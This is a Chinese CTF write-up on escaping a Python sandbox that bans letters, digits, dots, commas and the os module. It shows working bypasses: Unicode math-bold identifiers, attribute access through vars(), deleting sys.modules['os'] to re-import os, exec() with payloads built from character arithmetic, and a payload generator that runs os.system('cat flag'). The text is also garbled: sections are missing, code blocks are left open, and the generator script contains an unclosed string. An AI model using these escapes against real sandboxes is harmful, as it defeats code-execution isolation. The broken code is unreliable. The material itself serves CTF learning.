<p>根据提示，ban掉了：</p>
<ul>
<li>letters（字母） - 所有英文字母 a-z, A-Z</li>
<li>digits（数字） - 所有数字 0-9</li>
<li>点号 <code>.</code> - 不能用点访问属性</li>
<li>逗号 <code>,</code> - 不能用逗号分隔参数</li>
<li><code>getattr()</code> 函数 - 被替换成空函数</li>
<li><code>help()</code> 函数 - 被替换成空函数</li>
<li><code>os</code> 模块 - 被预加载为字符串</li>
<li><code>subprocess</code> 模块 - 被预加载为字符串</li>
</ul>
<p><strong>简单说就是：不能直接写正常的 Python 代码，因为变量名、函数名都需要字母和点号</strong></p>

<h2 id="二绕过策略详解">二、绕过策略详解</h2>
<h3 id="21-绕过字母限制---unicode-normalization">2.1 绕过字母限制 - Unicode Normalization</h3>
<p><strong>核心原理：</strong> Python 3 在解析代码时会自动将某些 Unicode 字符（如数学粗体字母）转换为标准 ASCII 字符</p>
<p><code>**&lt;font style="background-color:#FBDE28;"&gt;数学粗体不算字母&lt;/font&gt;**</code></p>
<pre><code class="language-python"># 输入：𝐞𝐱𝐞𝐜  (数学粗体)
# Python 解析后：exec  (标准 ASCII)
</code></pre>
<pre><code class="language-python">def bold_text(text):
    """将 ASCII 字母转换为 Unicode 数学粗体形式"""
    result = []
    for char in text:
        if 'A' &lt;= char &lt;= 'Z':
            bold_char = chr(ord(char) + 0x1D400 - ord('A'))
            result.append(bold_char)
        elif 'a' &lt;= char &lt;= 'z':
            bold_char = chr(ord(char) + 0x1D41A - ord('a'))
            result.append(bold_char)
        else:
            result.append(char)
    return ''.join(result)

if __name__ == "__main__":
    user_input = input("请输入要加粗的文本: ")
    print("\n转换结果:")
    print(bold_text(user_input))
</code></pre>

<li><code>chr</code> → <code>𝐜𝐡𝐫</code></li>

<li><code>vars</code> → <code>𝐯𝐚𝐫𝐬</code></li>

<h3 id="22-绕过点号限制---使用-vars">2.2 绕过点号限制 - 使用 vars()</h3>
<p>通常我们使用 <code>obj.method()</code> 来调用方法，但点号被禁用了。</p>
<p><strong>解决方案：</strong> 使用 <code>vars()</code> 函数获取对象的属性字典</p>
<pre><code class="language-python"># 传统方式（被禁用）
os.system('cat flag')

# 绕过方式
vars(os)['system']('cat flag')
</code></pre>
<p><strong>vars() 函数说明：</strong></p>
<ul>
<li><code>vars(obj)</code> 返回对象的 <code>__dict__</code> 属性</li>
<li>可以通过字典访问的方式调用方法</li>
<li>等价于 <code>obj.__dict__['method']()</code></li>
</ul>
<h3 id="23-解封-os-模块---删除-sysmodules">2.3 解封 os 模块 - 删除 sys.modules</h3>
<p>题目预先将 <code>sys.modules['os']</code> 设置为字符串 <code>'Forbidden'</code>，导致无法正常导入。</p>
<p>Python 导入模块时会先检查 <code>sys.modules</code>：</p>
<ol>
<li>如果模块已存在，直接返回缓存的模块</li>
<li>如果不存在，才会真正导入</li>
</ol>
<pre><code class="language-python"># 删除伪造的模块
del modules['os']

# 重新导入真正的 os 模块
__import__('os')
</code></pre>
<h3 id="24-多行代码执行---使用-exec">2.4 多行代码执行 - 使用 exec()</h3>
<ul>
<li><code>eval()</code> 只能执行单个表达式</li>
<li>逗号被禁用，无法使用海象运算符 <code>:=</code></li>
<li>需要执行多条语句（删除模块 + 导入模块 + 执行命令）</li>
</ul>
<p>使用 <code>exec()</code> 执行多行代码：</p>
<pre><code class="language-python">exec("del modules['os']\nvars(__import__('os'))['system']('cat flag')")
</code></pre>
<p><strong>exec() v.s. eval()</strong></p>
<ul>
<li><code>eval()</code>：只能执行单个表达式，有返回值</li>
<li><code>exec()</code>：可以执行多条语句，无返回值</li>
</ul>
<h3 id="25-绕过数字限制---八进制--字符运算">2.5 绕过数字限制 - 八进制 + 字符运算</h3>
<p>数字被禁用，无法直接写字符串。</p>
<h4 id="八进制转义">八进制转义</h4>
<pre><code class="language-python"># 'd' 的 ASCII 码是 100，八进制是 \144
"\144"  # 等价于 'd'
</code></pre>
<h4 id="字符运算">字符运算</h4>
<p>使用带重音符号的字符进行加减运算：</p>
<pre><code class="language-python"># 'd' 的 ASCII 码是 100
chr(ord('ō') - ord('é'))  # 'ō' 是 333，'é' 是 233，差值是 100
</code></pre>
<p><strong>为什么用减法而不是加法？</strong></p>
<ul>
<li>加法可能产生 ASCII 字母（被检测）</li>
<li>减法更容易控制结果范围</li>
</ul>

<h3 id="32-第二阶段使用字符运算完全绕过数字">3.2 第二阶段：使用字符运算（完全绕过数字）</h3>
<p>将八进制中的数字也替换为字符运算：</p>
<pre><code class="language-python">𝐞𝐱𝐞𝐜(𝐜𝐡𝐫(𝐨𝐫𝐝('ō')-𝐨𝐫𝐝('é'))+𝐜𝐡𝐫(𝐨𝐫𝐝('ō')-𝐨𝐫𝐝('è'))+...)

<pre><code class="language-python"># gen_payload_full_unicode.py

def to_math_bold(s):
    """将 ASCII 字母转为 Unicode 数学粗体"""
    res = []
    for c in s:
        if 'A' &lt;= c &lt;= 'Z':
            res.append(chr(ord(c) - ord('A') + 0x1D400))
        elif 'a' &lt;= c &lt;= 'z':
            res.append(chr(ord(c) - ord('a') + 0x1D41A))
        else:
            res.append(c)
    return ''.join(res)

def char_to_expr(c):
    """
    将单个字符 c 转换为 chr(ord('ō') - ord(X)) 形式
    其中 X = chr(333 - ord(c))
    """
    code = ord(c)
    base_char = chr(333 - code)  # 因为 ord('ō') = 333
    # 返回字符串形式：chr(ord('ō')-ord('X'))
    return f"𝐜𝐡𝐫(𝐨𝐫𝐝('ō')-𝐨𝐫𝐝('{base_char}'))"

def str_to_char_expr(s):
    """将整个字符串转为字符运算拼接表达式"""
    parts = [char_to_expr(c) for c in s]
    # 用 '+' 连接（注意：不能用逗号！）
    return '+'.join(parts)

# 原始 payload 内容
payload_code = '''del modules['os']

# 步骤 1: 将 payload_code 转为字符运算表达式
expr = str_to_char_expr(payload_code)

# 步骤 2: 构造 exec( ... ) 调用
exec_call = f"𝐞𝐱𝐞𝐜({expr})"

print("=== Final Payload (Full Unicode Char Arithmetic) ===")
print(exec_call)
print("\n=== Length:", len(exec_call), "characters ===")
